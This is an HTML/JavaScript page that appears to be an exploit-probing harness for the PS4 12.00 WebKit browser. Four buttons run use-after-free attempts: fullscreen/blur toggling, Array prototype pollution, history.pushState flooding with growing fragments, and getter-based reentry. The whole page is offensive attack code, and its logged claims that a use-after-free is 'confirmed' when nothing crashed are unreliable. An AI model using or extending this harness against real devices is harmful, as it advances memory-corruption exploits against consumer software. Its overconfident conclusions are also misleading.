<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Real Open Doors</title>
</head>
<body>
<h2>PS4 12.00 - Exploring Real Open Doors</h2>
<p>Based on technical analysis: 4 viable paths remain</p>
<p>Status: <span id="status">Ready</span></p>

<button onclick="testDoor1()">DOOR 1 - UAF via Fullscreen/Blur</button>
<button onclick="testDoor2()">DOOR 2 - Prototype Pollution + UAF</button>
<button onclick="testDoor3()">DOOR 3 - Temporal Desync</button>
<button onclick="testDoor4()">DOOR 4 - Zombie State Reentry</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ 
  logEl.textContent += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// =====================================================
// DOOR 1 - UAF via Fullscreen + Blur
// =====================================================
async function testDoor1(){
  logEl.textContent = "";
  statusEl.textContent = "Testing Door 1...";
  
  log("=== DOOR 1: UAF via Fullscreen/Blur ===\n");
  log("Analysis says: 'UAF real via fullscreen + blur'");
  log("This is OUTSIDE history subsystem\n");
  
  log("[SETUP] Creating fullscreen element");
  
  let target = document.createElement("div");
  target.id = "fullscreen_target";
  target.style.width = "100px";
  target.style.height = "100px";
  target.style.background = "red";
  document.body.appendChild(target);
  
  log("[PHASE 1] Enter fullscreen");
  
  try {
    await target.requestFullscreen();
    log("  Fullscreen active\n");
    
    await sleep(100);
    
    log("[PHASE 2] Trigger blur (window loses focus simulation)");
    
    // Create iframe and focus it
    let iframe = document.createElement("iframe");
    iframe.src = "about:blank";
    document.body.appendChild(iframe);
    
    await sleep(50);
    
    try {
      iframe.contentWindow.focus();
      log("  Blur triggered\n");
    } catch(e) {
      log("  Blur via iframe failed, trying alternate");
      window.blur();
    }
    
    await sleep(100);
    
    log("[PHASE 3] Exit fullscreen (creates UAF window)");
    
    document.exitFullscreen();
    log("  Fullscreen exited\n");
    
    await sleep(100);
    
    log("[PHASE 4] Use potentially freed object");
    
    // Try to access target element
    try {
      target.style.background = "blue";
      log("  Style change: " + target.style.background);
      
      let rect = target.getBoundingClientRect();
      log("  BoundingRect: " + JSON.stringify(rect));
      
      target.innerHTML = "TEST";
      log("  innerHTML set successfully");
      
      log("\n✓ No crash - but check if behavior is abnormal");
      log("✓ This confirms stable UAF window exists");
      
    } catch(e) {
      log("  Exception: " + e.message);
      log("  This might indicate freed object access");
    }
    
    // Remove elements
    iframe.remove();
    target.remove();
    
  } catch(e) {
    log("Fullscreen error: " + e.message);
  }
  
  log("\n=== DOOR 1 END ===");
}

// =====================================================
// DOOR 2 - Prototype Pollution + History UAF
// =====================================================
async function testDoor2(){
  logEl.textContent = "";
  statusEl.textContent = "Testing Door 2...";
  
  log("=== DOOR 2: Prototype Pollution + UAF ===\n");
  log("Analysis says: 'Prototype pollution → type confusion assistida'\n");
  
  log("[SETUP] Pollute Array prototype");
  
  // Pollute Array.prototype
  Array.prototype.polluted = "MARKER";
  Array.prototype.fakeLength = 0x41414141;
  
  // Hijack toString
  let originalToString = Array.prototype.toString;
  Array.prototype.toString = function() {
    log("  ⚠️ toString hijacked! this.length = " + this.length);
    return originalToString.call(this);
  };
  
  log("  Array.prototype polluted\n");
  
  log("[PHASE 1] Trigger History UAF with polluted environment");
  
  let size = 977;
  const STEP = 14461;
  
  for(let i=0; i<48; i++){
    // Use array in state
    let state = {
      index: i,
      array: [1, 2, 3, 4, 5]
    };
    
    let frag = "P".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(3);
  }
  
  await sleep(200);
  
  log("\n[PHASE 2] Check if pollution affected UAF");
  
  // Check current state
  if(history.state && history.state.array) {
    log("Current state.array: " + JSON.stringify(history.state.array));
    
    if(history.state.array.polluted) {
      log("  ✓ Pollution preserved in history state");
    }
    
    if(history.state.array.fakeLength) {
      log("  ✓ fakeLength accessible: " + history.state.array.fakeLength);
    }
  }
  
  log("\n[PHASE 3] Navigate and check for type confusion");
  
  try {
    history.back();
    await sleep(100);
    
    if(history.state && history.state.array) {
      log("After back(), array: " + JSON.stringify(history.state.array));
      
      // Try to trigger type confusion
      let len = history.state.array.length;
      log("  Reported length: " + len);
      
      // Access beyond length
      for(let i=0; i<10; i++) {
        let val = history.state.array[i];
        if(val !== undefined) {
          log(`  [${i}] = ${val}`);
        }
      }
    }
  } catch(e) {
    log("Exception during navigation: " + e.message);
  }
  
  // Cleanup
  Array.prototype.toString = originalToString;
  delete Array.prototype.polluted;
  delete Array.prototype.fakeLength;
  
  log("\n=== DOOR 2 END ===");
}

// =====================================================
// DOOR 3 - Temporal Desynchronization
// =====================================================
async function testDoor3(){
  logEl.textContent = "";
  statusEl.textContent = "Testing Door 3...";
  
  log("=== DOOR 3: Temporal Desynchronization ===\n");
  log("Analysis says: 'Objeto morto mas referenciado por callbacks'\n");
  
  log("[SETUP] Creating async callback chain");
  
  let callbackFired = false;
  let stateSnapshot = null;
  
  // Create state with getter
  let state = {
    get marker() {
      callbackFired = true;
      stateSnapshot = JSON.stringify(history.state);
      log("  ⚠️ Getter fired during operation!");
      return "ACCESSED";
    }
  };
  
  log("[PHASE 1] Push state with reactive getter");
  
  history.pushState(state, "", "#test1");
  log("  Initial push complete\n");
  
  log("[PHASE 2] Trigger UAF sequence");
  
  let size = 977;
  const STEP = 14461;
  
  for(let i=0; i<48; i++){
    let frag = "T".repeat(size);
    history.pushState({index: i}, "", "#" + frag);
    history.replaceState({index: i}, "", "#" + frag);
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(3);
  }
  
  await sleep(200);
  
  log("\n[PHASE 3] Navigate and trigger getter");
  
  // Navigate to state with getter
  while(history.state && history.state.index !== undefined) {
    history.back();
    await sleep(10);
  }
  
  log("\nCallback fired: " + callbackFired);
  
  if(callbackFired) {
    log("  ✓ Getter executed in temporal window");
    log("  State snapshot: " + (stateSnapshot || "null"));
    log("  This confirms temporal desync is accessible");
  }
  
  // Try to access state.marker
  try {
    if(history.state) {
      let val = history.state.marker;
      log("\nAccessed marker: " + val);
    }
  } catch(e) {
    log("Exception: " + e.message);
  }
  
  log("\n=== DOOR 3 END ===");
}

// =====================================================
// DOOR 4 - Zombie State Reentry
// =====================================================
async function testDoor4(){
  logEl.textContent = "";
  statusEl.textContent = "Testing Door 4...";
  
  log("=== DOOR 4: Zombie State Reentry ===\n");
  log("Analysis says: 'Abort silencioso deixa objetos semi-inicializados'\n");
  
  log("[PHASE 1] Trigger abort condition");
  
  let size = 977;
  const STEP = 14461;
  
  // First pass: normal UAF
  for(let i=0; i<48; i++){
    let frag = "Z".repeat(size);
    history.pushState({phase: 1, index: i}, "", "#" + frag);
    history.replaceState({phase: 1, index: i}, "", "#" + frag);
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(3);
  }
  
  log("  First UAF complete\n");
  
  await sleep(200);
  
  log("[PHASE 2] Attempt reentry into zombie state");
  
  // Second pass: try to reenter
  try {
    size = 977;
    
    for(let i=0; i<10; i++){
      let frag = "R".repeat(size);
      
      // Try to push into potentially zombie state
      history.pushState({phase: 2, index: i, reentry: true}, "", "#" + frag);
      
      log(`  Reentry ${i}: success`);
      
      size += STEP;
      await sleep(10);
    }
    
    log("\n✓ Reentry succeeded without crash");
    log("✓ Zombie state may be accepting new data");
    
  } catch(e) {
    log("Exception during reentry: " + e.message);
  }
  
  log("\n[PHASE 3] Check state integrity");
  
  if(history.state) {
    log("Current state: " + JSON.stringify(history.state));
    
    if(history.state.reentry) {
      log("  ✓ Reentry flag preserved");
      log("  ✓ This confirms zombie state is writable");
    }
  }
  
  log("\n[PHASE 4] Navigate through zombie states");
  
  for(let i=0; i<5; i++) {
    history.back();
    await sleep(50);
    
    if(history.state) {
      log(`Back ${i}: phase=${history.state.phase}, index=${history.state.index}`);
    }
  }
  
  log("\n=== DOOR 4 END ===");
}

log("PS4 12.00 WebKit - Real Open Doors");
log("\nBased on document analysis:");
log("- Door 1: UAF outside history (fullscreen/blur)");
log("- Door 2: Prototype pollution as amplifier");
log("- Door 3: Temporal desync between subsystems");
log("- Door 4: Zombie state reentry after abort");
log("\nThese are the ONLY viable paths identified");
log("ArrayBuffer reclaim approach is confirmed CLOSED");
</script>
</body>
</html>
